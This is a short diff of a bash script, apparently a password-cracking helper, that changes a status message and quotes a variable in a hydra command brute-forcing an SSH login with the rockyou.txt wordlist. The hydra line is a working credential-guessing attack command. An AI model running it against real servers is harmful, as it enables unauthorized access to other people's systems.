@@ -213,7 +213,7 @@ else
                     if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
                         open "${service}.txt"
                     else
-                        echo -e "\n[ ${RED}${BRIGHT}-${NC} ] Ok I will not open the ${service}.txt file"
+                        echo -e "\n[ ${RED}${BRIGHT}X${NC} ] Ok I will not open the ${service}.txt file"
                         sleep 1
                     fi
                 fi
@@ -281,7 +281,7 @@ else
                     else
 
                         # Crack SSH password
-                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
+                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                         # Alerts the user that the computer is trying to connect to the ssh server
                         title="Connecting to ${GREEN}${user}${NC}"
                         Connecting_To_SSH_SERVER="We are connecting you to ${GREEN}${user}${NC}. Please wait..."
